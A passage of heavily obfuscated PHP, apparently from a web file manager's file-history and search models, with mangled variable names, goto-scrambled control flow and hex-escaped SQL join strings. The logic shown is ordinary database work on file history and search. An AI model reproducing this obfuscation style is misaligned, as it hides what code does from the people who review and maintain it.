$F‰·¶ÁÆÕÌ[33], $F‰·¶ÁÆÕÌ[441]); goto A¯„Ğ¢–¥Ò; aµøª„¤äê: $C ¨‡†Áá = $bçê‰éõĞº == $F‰·¶ÁÆÕÌ[1108] ? 5 : $e°—•‚ô; if ($e°—•‚ô <= 1) { $C ¨‡†Áá = 1; } if ($C ¨‡†Áá >= 500) { return; } goto CùÃ¾‚Šâğ; CÒÀŒŸç¾Ë: $this->where($dµòãøëÙß)->delete(); Model($F‰·¶ÁÆÕÌ[444])->remove($fÙ½……—¹Á); goto f°‘Ì­ŒÎÒ; CùÃ¾‚Šâğ: $dµòãøëÙß = array($F‰·¶ÁÆÕÌ[404] => $D¨§óÓî„ï); $a·”™“²™Ğ = $this->field($F‰·¶ÁÆÕÌ[1906])->where($dµòãøëÙß)->order($F‰·¶ÁÆÕÌ[1900])->select(); if (!$a·”™“²™Ğ || $C ¨‡†Áá >= count($a·”™“²™Ğ)) { return; } goto eÂˆ‡©Ğì¢; fé†å˜½¦š: $F‰·¶ÁÆÕÌ =& $_SERVER[ÉóçÄÇ]; $bçê‰éõĞº = Model($F‰·¶ÁÆÕÌ[1106])->get($F‰·¶ÁÆÕÌ[1107]); $e°—•‚ô = $GLOBALS[$F‰·¶ÁÆÕÌ[6]][$F‰·¶ÁÆÕÌ[87]][$F‰·¶ÁÆÕÌ[1085]]; goto aµøª„¤äê; A¯„Ğ¢–¥Ò: $fÙ½……—¹Á = array_slice($fÙ½……—¹Á, $C ¨‡†Áá); if (!$dÏÌò¹¥ëÂ || !$fÙ½……—¹Á) { return; } $dµòãøëÙß = array($F‰·¶ÁÆÕÌ[406] => array($F‰·¶ÁÆÕÌ[7], $dÏÌò¹¥ëÂ)); goto CÒÀŒŸç¾Ë; f°‘Ì­ŒÎÒ: } public function listData($B«ÔÔì—®) { goto f¸ŠŒ¨»ë; A×Óº¥«åî: $då‰Í•ôåì = 5; if ($aƒè¡×É == $cÄÔº­©¨[1108]) { $AìÆîŠÖ¬[$cÄÔº­©¨[365]] = array_slice($AìÆîŠÖ¬[$cÄÔº­©¨[365]], 0, $då‰Í•ôåì); $AìÆîŠÖ¬[$cÄÔº­©¨[362]] = array($cÄÔº­©¨[1908] => 1, $cÄÔº­©¨[1909] => 20, $cÄÔº­©¨[1910] => 1, $cÄÔº­©¨[1911] => count($AìÆîŠÖ¬[$cÄÔº­©¨[365]])); } return $AìÆîŠÖ¬; goto CÌÁ£õÅ×‚; c¾£ß¦Ş»à: $AìÆîŠÖ¬ = $this->field($d§À£„²Â)->where($dÑƒ°ô‚Á¬)->order($cÄÔº­©¨[1900])->selectPage(); $this->_listAppendUser($AìÆîŠÖ¬[$cÄÔº­©¨[365]]); $aƒè¡×É = Model($cÄÔº­©¨[1106])->get($cÄÔº­©¨[1107]); goto A×Óº¥«åî; f¸ŠŒ¨»ë: $cÄÔº­©¨ =& $_SERVER[ÉóçÄÇ]; $dÑƒ°ô‚Á¬ = array($cÄÔº­©¨[404] => $B«ÔÔì—®); $d§À£„²Â = $cÄÔº­©¨[1907]; goto c¾£ß¦Ş»à; CÌÁ£õÅ×‚: } protected function _listAppendUser(&$C£ñ‚âŒ†) { $fÙ°‹ç˜ŒÉ =& $_SERVER[ÉóçÄÇ]; $b’êßÔ° = array_to_keyvalue($C£ñ‚âŒ†, $fÙ°‹ç˜ŒÉ[33], $fÙ°‹ç˜ŒÉ[1511]); $b£«óÎ¶« = Model($fÙ°‹ç˜ŒÉ[501])->userListInfo($b’êßÔ°); foreach ($C£ñ‚âŒ† as &$Dé¶¤Äç¢) { $cğÅÕ¬ì = $Dé¶¤Äç¢[$fÙ°‹ç˜ŒÉ[1511]]; $Dé¶¤Äç¢[$fÙ°‹ç˜ŒÉ[426]] = $b£«óÎ¶«[$cğÅÕ¬ì] ? $b£«óÎ¶«[$cğÅÕ¬ì] : !1; } unset($Dé¶¤Äç¢); } public function fileInfo($AÍÀ»ÍÎ·) { $aäÆíŸ›ãí =& $_SERVER[ÉóçÄÇ]; $Eâå×âÍ®è = $this->tablePrefix; $B÷–’¤’¢“ = "{$Eâå×âÍ®è}\151\x6f\137\x66\151\x6c\145\40\146\151\154\145\163\40\x6f\156\40\146\x69\x6c\145\x73\56\146\x69\154\145\111\x44\x20\75\x20\x68\151\x73\164\157\x72\x79\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($aäÆíŸ›ãí[1912])->where(array($aäÆíŸ›ãí[406] => $AÍÀ»ÍÎ·))->join($B÷–’¤’¢“, $aäÆíŸ›ãí[1913])->find(); } public function removeItem($C†…åæóˆ) { $C†Èˆ‹Ä±™ =& $_SERVER[ÉóçÄÇ]; $a‹ğ—¶ˆ = array($C†Èˆ‹Ä±™[406] => $C†…åæóˆ); $fìº÷áØºã = $this->where($a‹ğ—¶ˆ)->find(); if ($fìº÷áØºã) { $A¥ŠîÔ¥Ú = $this->where($a‹ğ—¶ˆ)->delete(); Model($C†Èˆ‹Ä±™[444])->remove($fìº÷áØºã[$C†Èˆ‹Ä±™[441]]); return $A¥ŠîÔ¥Ú; } return !1; } public function removeBySource($fáÚÚ˜à…µ) { goto FèôØÍÍôä; FÏö“¾ì: return !0; goto Cç“…ÕÑ«Ä; FèôØÍÍôä: $dñ„ŸÚÉÁ =& $_SERVER[ÉóçÄÇ]; if (!$fáÚÚ˜à…µ) { return !1; } if (!is_array($fáÚÚ˜à…µ)) { $fáÚÚ˜à…µ = array($fáÚÚ˜à…µ); } goto A’¨óĞ¿…; A’¨óĞ¿…: $e¸‡Ş˜Ùçº = array($dñ„ŸÚÉÁ[404] => array($dñ„ŸÚÉÁ[7], $fáÚÚ˜à…µ)); $D¦Ä¨Üˆ = $this->field($dñ„ŸÚÉÁ[442])->where($e¸‡Ş˜Ùçº)->select(); if ($D¦Ä¨Üˆ) { $this->where($e¸‡Ş˜Ùçº)->delete(); $cì¢œÆ¯“­ = array_to_keyvalue($D¦Ä¨Üˆ, $dñ„ŸÚÉÁ[33], $dñ„ŸÚÉÁ[441]); Model($dñ„ŸÚÉÁ[444])->remove($cì¢œÆ¯“­); } goto FÏö“¾ì; Cç“…ÕÑ«Ä: } public function setDetail($fŸ ÏÜğŒ, $eŞ¥‘ƒğ) { $cÁƒ÷Û¬ =& $_SERVER[ÉóçÄÇ]; return $this->where(array($cÁƒ÷Û¬[406] => $fŸ ÏÜğŒ))->save(array($cÁƒ÷Û¬[1903] => $eŞ¥‘ƒğ)); } public function rollbackToItem($d œ›Á ’, $EÇôØ×µ»“) { goto EƒßÕëÀ¨‰; EƒßÕëÀ¨‰: $fÌ¯«…†ïæ =& $_SERVER[ÉóçÄÇ]; $d…‰Ãµ•®¨ = Model($fÌ¯«…†ïæ[776])->sourceInfo($d œ›Á ’); $this->addHistory($d…‰Ãµ•®¨, LNG($fÌ¯«…†ïæ[1914])); goto EéÅ‹¼ˆ¶…; Eğí÷É£œ: return $this->where(array($fÌ¯«…†ïæ[406] => $EÇôØ×µ»“))->delete(); goto c¢°Ìµ‘Ù„; EéÅ‹¼ˆ¶…: $F‘ÇëºŞÉã = $this->find($EÇôØ×µ»“); $f°Ççµ¦ = array($fÌ¯«…†ïæ[441] => $F‘ÇëºŞÉã[$fÌ¯«…†ïæ[441]], $fÌ¯«…†ïæ[77] => $F‘ÇëºŞÉã[$fÌ¯«…†ïæ[77]], $fÌ¯«…†ïæ[83] => time(), $fÌ¯«…†ïæ[428] => USER_ID); Model($fÌ¯«…†ïæ[776])->where(array($fÌ¯«…†ïæ[390] => $d œ›Á ’))->save($f°Ççµ¦); goto Eğí÷É£œ; c¢°Ìµ‘Ù„: } public function clearSame($aàÃç ÔÜ) { goto CÙğ³›øî; FÀ‡ğÒÕÏĞ: if (!$dğŸÇÎ÷ ) { return; } $this->where(array($Cé„”îÀñÖ[388] => array($Cé„”îÀñÖ[7], $dğŸÇÎ÷ )))->delete(); Model($Cé„”îÀñÖ[444])->remove($Fñá÷Ô…’‹); goto f³“ÚùæĞ; CÙğ³›øî: $Cé„”îÀñÖ =& $_SERVER[ÉóçÄÇ]; $C¥—Å„ÒÛ = $this->listData($aàÃç ÔÜ); $fŞŠ»º”ã = array_to_keyvalue_group($C¥—Å„ÒÛ, $Cé„”îÀñÖ[441]); goto aò·Ü“ßèÒ; aò·Ü“ßèÒ: $Fñá÷Ô…’‹ = array(); $dğŸÇÎ÷  = array(); foreach ($fŞŠ»º”ã as $d¥óÄƒñÜ°) { if (!$d¥óÄƒñÜ° || count($d¥óÄƒñÜ°) <= 1) { continue; } foreach ($d¥óÄƒñÜ° as $fÄÕ£³“) { $Fñá÷Ô…’‹[] = $fÄÕ£³“[$Cé„”îÀñÖ[441]]; $dğŸÇÎ÷ [] = $fÄÕ£³“[$Cé„”îÀñÖ[388]]; } } goto FÀ‡ğÒÕÏĞ; f³“ÚùæĞ: } public function userSpace() { $aÅÍãŞó§Ï =& $_SERVER[ÉóçÄÇ]; $F×Ù…‚¼§Á = $this->tablePrefix; $F™‡ª®¢İ = array($aÅÍãŞó§Ï[1503] => USER_ID); $a‹ƒ¨¤‡¶ = "{$F×Ù…‚¼§Á}\x69\x6f\x5f\x66\x69\154\145\40\x66\x69\x6c\145\x73\x20\157\x6e\x20\x66\x69\x6c\145\x73\56\x66\x69\154\145\x49\x44\x20\x3d\x20\150\151\163\164\157\162\x79\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($aÅÍãŞó§Ï[1912])->where($F™‡ª®¢İ)->join($a‹ƒ¨¤‡¶, $aÅÍãŞó§Ï[1913])->sum($aÅÍãŞó§Ï[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($F¯…‡‡æ°) { goto f»‡÷æ…êº; f»‡÷æ…êº: $CÑ‡ÓÜêÇ› =& $_SERVER[ÉóçÄÇ]; $F‡Œ÷¡œÅÓ = KodIO::fileTypeList(); $f¬‚¼‚œšš = $F‡Œ÷¡œÅÓ[$F¯…‡‡æ°]; goto c¼‹Î£ ïÙ; c¼‹Î£ ïÙ: if (!$f¬‚¼‚œšš) { return array(); } $E¥Óç“¬Ğ™ = $f¬‚¼‚œšš[$CÑ‡ÓÜêÇ›[167]]; $c§”óÆ¢Ò = $CÑ‡ÓÜêÇ›[7]; goto A×áÃš‚ƒ; A×áÃš‚ƒ: if (!$f¬‚¼‚œšš[$CÑ‡ÓÜêÇ›[167]]) { $fÄ‘ŸØø¹› = array_to_keyvalue($F‡Œ÷¡œÅÓ, $CÑ‡ÓÜêÇ›[33], $CÑ‡ÓÜêÇ›[167]); $E¥Óç“¬Ğ™ = implode($CÑ‡ÓÜêÇ›[47], $fÄ‘ŸØø¹›); $c§”óÆ¢Ò = $CÑ‡ÓÜêÇ›[1915]; } $f¼šæ¬› = explode($CÑ‡ÓÜêÇ›[47], trim($E¥Óç“¬Ğ™, $CÑ‡ÓÜêÇ›[47])); return array($c§”óÆ¢Ò, $f¼šæ¬›); goto aŒ÷Ã‡ËÄÊ; aŒ÷Ã‡ËÄÊ: } public function listPathType($d®†ÖÉØçô) { $AªÏí»ö×› =& $_SERVER[ÉóçÄÇ]; $Cßõ‰Ø… = $this->fileTypeWhere($d®†ÖÉØçô); if (!$Cßõ‰Ø…) { return array(); } $c÷Œ¥‚ï—œ = array($AªÏí»ö×›[544] => SourceModel::TYPE_USER, $AªÏí»ö×›[545] => USER_ID, $AªÏí»ö×›[541] => 0, $AªÏí»ö×›[542] => $Cßõ‰Ø…); return $this->listSource($c÷Œ¥‚ï—œ); } public function listSearch($fÉæ¢ªÆğ¡, $fÖ†’Ò¬ì† = 300) { goto b³ñ–¨×¿; A×äÀËÒï›: $fá‚ÆÍ’…¬ = $this->distinct(!0)->field($fòÅô©î‹¿)->where($FÛåãä–ò)->selectPage($fÖ†’Ò¬ì†); $this->_listSearchDesc($fá‚ÆÍ’…¬, $fÉæ¢ªÆğ¡, $aÄº¼‚âÓÏ); $this->_listSearchTag($fá‚ÆÍ’…¬, $fÉæ¢ªÆğ¡, $aÄº¼‚âÓÏ); goto e¡ÈÊ‚˜Ù; Eë¿ÉÀ¨ÛÊ: return $fá‚ÆÍ’…¬; goto d™ã¿ó†»Ì; DÔ›§ä¹©Œ: if (!isset($FÛåãä–ò[$eÁÃÓÁÅº[417]])) { $FÛåãä–ò[$eÁÃÓÁÅº[417]] = 0; } $fòÅô©î‹¿ = $eÁÃÓÁÅº[1917]; $aÄº¼‚âÓÏ = $fòÅô©î‹¿; goto cê¬×Í±¶À; cê¬×Í±¶À: $this->_listSearchBindPinyin($fÉæ¢ªÆğ¡, $FÛåãä–ò, $fòÅô©î‹¿); $this->alias($eÁÃÓÁÅº[511])->_makeOrder(); $FÛåãä–ò = $this->parseWhereLike($FÛåãä–ò); goto A×äÀËÒï›; b³ñ–¨×¿: $eÁÃÓÁÅº =& $_SERVER[ÉóçÄÇ]; if (isset($fÉæ¢ªÆğ¡[$eÁÃÓÁÅº[1758]]) && $fÉæ¢ªÆğ¡[$eÁÃÓÁÅº[1758]]) { $fÉæ¢ªÆğ¡[$eÁÃÓÁÅº[1758]] = str_replace($eÁÃÓÁÅº[379], $eÁÃÓÁÅº[1916], trim($fÉæ¢ªÆğ¡[$eÁÃÓÁÅº[1758]])); } $FÛåãä–ò = $this->_parseSearchWhere($fÉæ¢ªÆğ¡); goto DÔ›§ä¹©Œ; e¡ÈÊ‚˜Ù: $this->_listSearchGroupTag($fá‚ÆÍ’…¬, $fÉæ¢ªÆğ¡, $aÄº¼‚âÓÏ); $this->_listDataApply($fá‚ÆÍ’…¬[$eÁÃÓÁÅº[365]]); $this->_listMake($fá‚ÆÍ’…¬); goto Eë¿ÉÀ¨ÛÊ; d™ã¿ó†»Ì: } private function _listSearchTag(&$A¦”å¹¬, $F©®É…‹¿è, $B³½ÕÊğğ) { goto fÕÄÂÕ›³¾; d¹¬Ó´Ó¾¥: $fÇŸÕ×Î£ = array_to_keyvalue($fÇŸÕ×Î£, $Aƒ¥½¹³—³[33], $Aƒ¥½¹³—³[75]); $EšÒŒ¹È = array_unique($fÇŸÕ×Î£); $this->_listSearchMerge($A¦”å¹¬, $F©®É…‹¿è, $B³½ÕÊğğ, $EšÒŒ¹È); goto bâ›ÖÀÓ£; A¨à–Š Æ: if (!$b²Ñ›¦¿£ì) { return; } $AÆØˆÚ¥À = array($Aƒ¥½¹³—³[413] => array($Aƒ¥½¹³—³[7], $b²Ñ›¦¿£ì), $Aƒ¥½¹³—³[1511] => USER_ID); $fÇŸÕ×Î£ = Model($Aƒ¥½¹³—³[414])->field($Aƒ¥½¹³—³[75])->where($AÆØˆÚ¥À)->select(); goto d¹¬Ó´Ó¾¥; E½¢ÈÜÅÄ: $b²Ñ›¦¿£ì = array(); $A×™İ¶Œ´ö = $F©®É…‹¿è[$Aƒ¥½¹³—³[1758]]; foreach ($E¹¹Ñ¾Š²¿ as $BØ¥•¦ÁÓ‘) { $aŠ¢¶ºÂ— = $BØ¥•¦ÁÓ‘[$Aƒ¥½¹³—³[28]]; $ašçîÊçÀ = str_replace($Aƒ¥½¹³—³[50], $Aƒ¥½¹³—³[33], Pinyin::encode($aŠ¢¶ºÂ—)); if (stripos($aŠ¢¶ºÂ—, $A×™İ¶Œ´ö) !== !1 || stripos($ašçîÊçÀ, $A×™İ¶Œ´ö) !== !1) { $b²Ñ›¦¿£ì[] = $BØ¥•¦ÁÓ‘[$Aƒ¥½¹³—³[388]]; } } goto A¨à–Š Æ; fÕÄÂÕ›³¾: $Aƒ¥½¹³—³ =& $_SERVER[ÉóçÄÇ]; if (!$F©®É…‹¿è[$Aƒ¥½¹³—³[1758]] || $A¦”å¹¬[$Aƒ¥½¹³—³[362]][$Aƒ¥½¹³—³[349]] > 1) { return; } $E¹¹Ñ¾Š²¿ = Model($Aƒ¥½¹³—³[1918])->listData(); goto E½¢ÈÜÅÄ; bâ›ÖÀÓ£: } private function _listSearchDesc(&$d‘ññ¾‚åŞ, $eÚŠ×„Ÿ¦¤, $A³Î»Ÿ¬˜) { goto F¾Œ¸é®¶; Bºƒ‡’‚Ì†: $C¡ô’‡·²¹ = array_unique($C¡ô’‡·²¹); if (!$C¡ô’‡·²¹) { return; } $aæà†¿æ»ê = array($e»ì‘ƒ™‹[390] => array($e»ì‘ƒ™‹[7], $C¡ô’‡·²¹), $e»ì‘ƒ™‹[92] => $e»ì‘ƒ™‹[425], $e»ì‘ƒ™‹[370] => array($e»ì‘ƒ™‹[378], $e»ì‘ƒ™‹[1760] . $eÚŠ×„Ÿ¦¤[$e»ì‘ƒ™‹[1758]] . $e»ì‘ƒ™‹[1760])); goto FÕ‚Ó×ÈàŞ; F¾Œ¸é®¶: $e»ì‘ƒ™‹ =& $_SERVER[ÉóçÄÇ]; if (!$eÚŠ×„Ÿ¦¤[$e»ì‘ƒ™‹[1758]] || $d‘ññ¾‚åŞ[$e»ì‘ƒ™‹[362]][$e»ì‘ƒ™‹[349]] > 1) { return; } $C¡ô’‡·²¹ = $this->listSearchChildren($eÚŠ×„Ÿ¦¤[$e»ì‘ƒ™‹[472]]); goto Bºƒ‡’‚Ì†; FÕ‚Ó×ÈàŞ: $F¤Î¼Ù’ä = Model($e»ì‘ƒ™‹[527])->field($e»ì‘ƒ™‹[390])->where($aæà†¿æ»ê)->select(); $D†Ÿƒ£×ƒá = array_to_keyvalue($F¤Î¼Ù’ä, $e»ì‘ƒ™‹[33], $e»ì‘ƒ™‹[390]); $this->_listSearchMerge($d‘ññ¾‚åŞ, $eÚŠ×„Ÿ¦¤, $A³Î»Ÿ¬˜, $D†Ÿƒ£×ƒá); goto B«Êß¹îƒë; B«Êß¹îƒë: } private function _listSearchGroupTag(&$f‡ù«Ç°§¥, $b‰êŞÜÉù§, $aâÈ…£Å™) { goto f ãÎÃñË; f ãÎÃñË: $cï¿ãº„‹Ä =& $_SERVER[ÉóçÄÇ]; if (!$b‰êŞÜÉù§[$cï¿ãº„‹Ä[1758]] || $f‡ù«Ç°§¥[$cï¿ãº„‹Ä[362]][$cï¿ãº„‹Ä[349]] > 1 || !$b‰êŞÜÉù§[$cï¿ãº„‹Ä[472]]) { return; } $f·ÜáŒ‚¾˜ = $this->sourceInfo($b‰êŞÜÉù§[$cï¿ãº„‹Ä[472]]); goto DŠô©íÃ¤Ç; DŠô©íÃ¤Ç: if (!$f·ÜáŒ‚¾˜ || $f·ÜáŒ‚¾˜[$cï¿ãº„‹Ä[398]] != SourceModel::TYPE_GROUP) { return; } $CåÃˆñ‘°Ú = $f·ÜáŒ‚¾˜[$cï¿ãº„‹Ä[478]]; $eˆÈ–æßé× = Model($cï¿ãº„‹Ä[1919])->get($CåÃˆñ‘°Ú); goto f§áÖ¯œƒÍ; f§áÖ¯œƒÍ: $FĞëƒ­Œæ = array(); $D‡Éõœ¾Ó = $b‰êŞÜÉù§[$cï¿ãº„‹Ä[1758]]; foreach ($eˆÈ–æßé×[$cï¿ãº„‹Ä[365]] as $F‚½¿¥ƒêƒ) { $eÓ¬¹–Ş¤ğ = $F‚½¿¥ƒêƒ[$cï¿ãº„‹Ä[28]]; $aÁ¯Îˆ©õ¤ = str_replace($cï¿ãº„‹Ä[50], $cï¿ãº„‹Ä[33], Pinyin::encode($eÓ¬¹–Ş¤ğ)); if (stripos($eÓ¬¹–Ş¤ğ, $D‡Éõœ¾Ó) !== !1 || stripos($aÁ¯Îˆ©õ¤, $D‡Éõœ¾Ó) !== !1) { $FĞëƒ­Œæ[] = $F‚½¿¥ƒêƒ[$cï¿ãº„‹Ä[388]]; } } goto aÙ‹Úå¦¿ß; C…½½­ƒ¬‘: $b°ğ¥Í  = array_to_keyvalue($b°ğ¥Í , $cï¿ãº„‹Ä[33], $cï¿ãº„‹Ä[75]); $C¸‘ªĞÑ¹ = array_unique($b°ğ¥Í ); $this->_listSearchMerge($f‡ù«Ç°§¥, $b‰êŞÜÉù§, $aâÈ…£Å™, $C¸‘ªĞÑ¹); goto d·ÍÕ„Ãá®; aÙ‹Úå¦¿ß: if (!$FĞëƒ­Œæ) { return; } $AÇš·åâò = array($cï¿ãº„‹Ä[413] => array($cï¿ãº„‹Ä[7], $FĞëƒ­Œæ), $cï¿ãº„‹Ä[1511] => 0, $cï¿ãº„‹Ä[29] => $cï¿ãº„‹Ä[1782] . $CåÃˆñ‘°Ú); $b°ğ¥Í  = Model($cï¿ãº„‹Ä[414])->field($cï¿ãº„‹Ä[75])->where($AÇš·åâò)->select(); goto C…½½­ƒ¬‘; d·ÍÕ„Ãá®: } private function _listSearchMerge(&$Cõ¿¬½÷¾ù, $E–ŞïÛÛè, $FÂÉÇ›Ş, $Bº¤¬ãïÆ) { goto cğÄÕ‹À½½; dñ¤§ÖÈË: $C»Ì•ƒºç† = $this->field($FÂÉÇ›Ş)->where($eÂß¸ò… œ)->select(); if (!$C»Ì•ƒºç†) { return; } $d‘èç“È = array(); goto D³¸ñÒ¡ƒ¥; D³¸ñÒ¡ƒ¥: foreach ($C»Ì•ƒºç† as $A·Øšé½Œ›) { if ($this->_listSearchFilter($A·Øšé½Œ›, $E–ŞïÛÛè)) { $d‘èç“È[] = $A·Øšé½Œ›; } } $Cõ¿¬½÷¾ù[$bÊ‡Ş¬Õù[365]] = array_merge($d‘èç“È, $Cõ¿¬½÷¾ù[$bÊ‡Ş¬Õù[365]]); $Cõ¿¬½÷¾ù[$bÊ‡Ş¬Õù[362]][$bÊ‡Ş¬Õù[363]] += count($d‘èç“È); goto f®‰Œù²íö; cğÄÕ‹À½½: $bÊ‡Ş¬Õù =& $_SERVER[ÉóçÄÇ]; if (!$Bº¤¬ãïÆ) { return; } $D§Àò…«‰Ö = array_to_keyvalue($Cõ¿¬½÷¾ù[$bÊ‡Ş¬Õù[365]], $bÊ‡Ş¬Õù[33], $bÊ‡Ş¬Õù[390]); goto fÊÃå²’±æ; fÊÃå²’±æ: $C³‘åËÉÉì = array_diff($Bº¤¬ãïÆ, $D§Àò…«‰Ö); if (!$C³‘åËÉÉì) { return; } $eÂß¸ò… œ = array($bÊ‡Ş¬Õù[390] => array($bÊ‡Ş¬Õù[7], $C³‘åËÉÉì)); goto dñ¤§ÖÈË; f®‰Œù²íö: } private function _listSearchFilter($B¿Èºïé, $Fë÷ŠÚ¦¡µ) { goto Cè¹Ä·´Ü¦; b×àÄÃÎÛŠ: if (isset($Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[557]]) && $Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[557]] != $B¿Èºïé[$f˜İÜ öâÏ[428]]) { return !1; } return !0; goto C•‡Û¢³™¬; C¨èŒ×ÉÖÁ: if (isset($Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[399]]) && $Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[399]] != $f˜İÜ öâÏ[1725]) { if ($Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[399]] == $f˜İÜ öâÏ[76] && !$c–£Ÿ·äè) { return !1; } if ($Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[399]] != $f˜İÜ öâÏ[76] && $c–£Ÿ·äè) { return !1; } if (!strstr($B¿Èºïé[$f˜İÜ öâÏ[167]], $f˜İÜ öâÏ[47] . $Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[399]] . $f˜İÜ öâÏ[47])) { return !1; } } if (isset($Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[1920]]) && $Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[1920]] < $B¿Èºïé[$f˜İÜ öâÏ[77]]) { return !1; } if (isset($Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[1921]]) && $Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[1921]] > $B¿Èºïé[$f˜İÜ öâÏ[77]]) { return !1; } goto b×àÄÃÎÛŠ; Cè¹Ä·´Ü¦: $f˜İÜ öâÏ =& $_SERVER[ÉóçÄÇ]; $c–£Ÿ·äè = $B¿Èºïé[$f˜İÜ öâÏ[397]] == $f˜İÜ öâÏ[86]; if (!strstr($B¿Èºïé[$f˜İÜ öâÏ[481]], $f˜İÜ öâÏ[47] . $Fë÷ŠÚ¦¡µ[$f˜İÜ öâÏ[472]] . $f˜İÜ öâÏ[47])) { return !1; } goto C¨èŒ×ÉÖÁ; C•‡Û¢³™¬: } public function listSearchChildren($dÆ•Á¤éá¤, $E‹Û¿®§¯ = 5000) { goto C®àÕ‚ğ§; bÎ´÷œ´…é: $E‰•ÃÇ§Ô = array($c²¥Ë˜øÂÑ[481] => array($c²¥Ë˜øÂÑ[378], $d¢„›Ğ©’[$c²¥Ë˜øÂÑ[481]] . $d¢„›Ğ©’[$c²¥Ë˜øÂÑ[390]] . $c²¥Ë˜øÂÑ[508])); $dÖ†™„ÄõÌ = $this->field($c²¥Ë˜øÂÑ[390])->cache(null, 600)->where($E‰•ÃÇ§Ô)->count(); if ($dÖ†™„ÄõÌ > $E‹Û¿®§¯) { return $this->_listSearchChildrenNear($dÆ•Á¤éá¤, $E‹Û¿®§¯); } goto e‚¹¾Ô©ö‘; e‚¹¾Ô©ö‘: $cÛì¸ñÄÑÆ = $this->field($c²¥Ë˜øÂÑ[390])->where($E‰•ÃÇ§Ô)->select(); $eĞ°‘ëã•å = array_to_keyvalue($cÛì¸ñÄÑÆ, $c²¥Ë˜øÂÑ[33], $c²¥Ë˜øÂÑ[390]); return $eĞ°‘ëã•å; goto F¿¦Ç±•å¼; C®àÕ‚ğ§: $c²¥Ë˜øÂÑ =& $_SERVER[ÉóçÄÇ]; $eĞ°‘ëã•å = array(); $d¢„›Ğ©’ = $this->sourceInfo($dÆ•Á¤éá¤); goto bÎ´÷œ´…é; F¿¦Ç±•å¼: } private function _listSearchChildrenNear($C¨„‡±®Šš, $A’ÒêğÈÅ) { goto FÑÈ¿—´‹ô; A‰á™¦Ş›¥: if (!$eÔ‡¸Ãô‚¶) { return $A„‰±‰¯¿; } $FšÙ›ø—¾ï = array($cŞÊ‚˜¿Ñ²[472] => array($cŞÊ‚˜¿Ñ²[7], $eÔ‡¸Ãô‚¶)); $BÛä¦Œî¶î = $this->field($cŞÊ‚˜¿Ñ²[1922])->where($FšÙ›ø—¾ï)->limit($A’ÒêğÈÅ)->select(); goto a‰±äß—”¯; dµ±·ë¦Ìã: $BÛä¦Œî¶î = $this->field($cŞÊ‚˜¿Ñ²[1922])->where($FšÙ›ø—¾ï)->select(); $eÔ‡¸Ãô‚¶ = array_to_keyvalue(array_filter_by_field($BÛä¦Œî¶î, $cŞÊ‚˜¿Ñ²[397], $cŞÊ‚˜¿Ñ²[86]), $cŞÊ‚˜¿Ñ²[33], $cŞÊ‚˜¿Ñ²[390]); $A„‰±‰¯¿ = array_merge($A„‰±‰¯¿, array_to_keyvalue($BÛä¦Œî¶î, $cŞÊ‚˜¿Ñ²[33], $cŞÊ‚˜¿Ñ²[390])); goto A‰á™¦Ş›¥; FÑÈ¿—´‹ô: $cŞÊ‚˜¿Ñ² =& $_SERVER[ÉóçÄÇ]; $A„‰±‰¯¿ = array(); $FšÙ›ø—¾ï = array($cŞÊ‚˜¿Ñ²[472] => $C¨„‡±®Šš); goto dµ±·ë¦Ìã; a‰±äß—”¯: $A„‰±‰¯¿ = array_merge($A„‰±‰¯¿, array_to_keyvalue($BÛä¦Œî¶î, $cŞÊ‚˜¿Ñ²[33], $cŞÊ‚˜¿Ñ²[390])); $A„‰±‰¯¿ = array_slice($A„‰±‰¯¿, 0, $A’ÒêğÈÅ); return $A„‰±‰¯¿; goto Eè—ìª§‚¶; Eè—ìª§‚¶: } private function _listSearchBindPinyin($F…Ü»ã¬•ˆ, &$dÈâ²•ó—, &$d‚°¹ÎØô†) { goto CêÒÅ·ÓÓ¢; CêÒÅ·ÓÓ¢: $Cßç§÷ÚÓ =& $_SERVER[ÉóçÄÇ]; if (!isset($F…Ü»ã¬•ˆ[$Cßç§÷ÚÓ[1758]]) || !$F…Ü»ã¬•ˆ[$Cßç§÷ÚÓ[1758]]) { return; } if (!Input::check($F…Ü»ã¬•ˆ[$Cßç§÷ÚÓ[1758]], $Cßç§÷ÚÓ[314]) || strlen($F…Ü»ã¬•ˆ[$Cßç§÷ÚÓ[1758]]) < 2) { return; } goto e•½Óİ°ÍÜ; aÀ×ï®Á§¸: $d‚°¹ÎØô† = $Cßç§÷ÚÓ[1924] . str_replace($Cßç§÷ÚÓ[47], $Cßç§÷ÚÓ[1925], $d‚°¹ÎØô†); $bäáğÄ¤Øà = $dÈâ²•ó—[$Cßç§÷ÚÓ[28]]; unset($dÈâ²•ó—[$Cßç§÷ÚÓ[28]]); goto D¢ßÁªÈè—; e•½Óİ°ÍÜ: $bê“’¦¿°¾ = "\114\x45\106\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\137\163\157\165\x72\x63\x65\137\155\145\x74\x61\x20\x6d\x65\164\141\x20\157\x6e\x20\163\157\x75\x72\x63\145\56\163\x6f\x75\162\x63\x65\x49\104\x20\75\40\x6d\x65\x74\x61\x2e\163\x6f\x75\162\143\x65\x49\x44"; $f´Ñ‚¾´Â­ = array(); $d‚°¹ÎØô† = str_replace(array($Cßç§÷ÚÓ[227], $Cßç§÷ÚÓ[50], $Cßç§÷ÚÓ[1923]), $Cßç§÷ÚÓ[33], $d‚°¹ÎØô†); goto aÀ×ï®Á§¸; C“Ğ©Ã©†: $dÈâ²•ó— = $f´Ñ‚¾´Â­; goto A÷™£ÕÜ¿·; D¢ßÁªÈè—: foreach ($dÈâ²•ó— as $aÒ¤¼åïäÆ => $D¤½¶½—Á¦) { $f´Ñ‚¾´Â­[$Cßç§÷ÚÓ[1924] . $aÒ¤¼åïäÆ] = $D¤½¶½—Á¦; } foreach ($bäáğÄ¤Øà as $bÃöäÁÏ•Œ) 